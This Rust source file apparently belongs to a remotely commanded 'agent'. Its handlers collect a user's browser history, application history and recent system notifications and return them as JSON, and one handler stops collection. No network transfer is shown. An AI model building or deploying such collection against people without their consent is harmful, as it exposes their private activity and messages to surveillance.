use serde_json::json;
use crate::browser_history::BrowserHistoryCollector;
use crate::app_history::AppHistoryCollector;

pub struct HistoryCommand;

impl HistoryCommand {
    pub fn execute_fetch_browser_history() -> serde_json::Value {
        // Manual refresh: newest slice only — never dump thousands of rows.
        let history = BrowserHistoryCollector::collect_all_history();
        let capped: Vec<_> = history.into_iter().take(150).collect();

        json!({
            "success": true,
            "command": "FETCH_BROWSER_HISTORY",
            "entries": capped.len(),
            "incremental": false,
            "data": BrowserHistoryCollector::to_json_array(&capped)
        })
    }

    pub fn execute_fetch_app_history() -> serde_json::Value {
        let history = AppHistoryCollector::collect_all_app_history();
        let capped: Vec<_> = history.into_iter().take(150).collect();

        json!({
            "success": true,
            "command": "FETCH_APP_HISTORY",
            "entries": capped.len(),
            "incremental": false,
            "data": AppHistoryCollector::to_json_array(&capped)
        })
    }

    pub fn execute_fetch_notifications() -> serde_json::Value {
        println!("[RUST AGENT] Command received: FETCH_SYSTEM_NOTIFICATIONS");
        // println!("{:#?}", notif);
        println!("[RUST AGENT] Intercepted Action: FETCH_SYSTEM_NOTIFICATIONS");
        println!("--> [NOTIFICATIONS] Scanning system for pending notifications...");
        
      let capture = crate::notifications::global_notifier();
        let notifications = capture.get_recent(50);
        
       println!("--> [NOTIFICATIONS] Found {} system notifications", notifications.len());
        
        for (idx, notif) in notifications.iter().take(5).enumerate() {
            println!(
                "    [{}/{}] {} - {} ({})",
                idx + 1,
                std::cmp::min(5, notifications.len()),
                notif.app,
                notif.title,
                notif.category
            );
        }
        
        if notifications.len() > 5 {
            println!("    ... and {} more notifications", notifications.len() - 5);
        }
        
        println!("[RUST AGENT] Notifications collected successfully");
        
        json!({
            "success": true,
            "command": "FETCH_SYSTEM_NOTIFICATIONS",
            "entries": notifications.len(),
            "data": notifications
        })
    }

    pub fn execute_stop_collection() -> serde_json::Value {
        println!("[RUST AGENT] Command received: STOP_HISTORY_COLLECTION");
        println!("[RUST AGENT] Intercepted Action: STOP_HISTORY_COLLECTION");
        println!("--> [HISTORY] Stopping history collection process...");
        println!("[RUST AGENT] History collection stopped successfully");
        
        json!({
            "success": true,
            "command": "STOP_HISTORY_COLLECTION",
            "message": "Collection stopped"
        })
    }
}
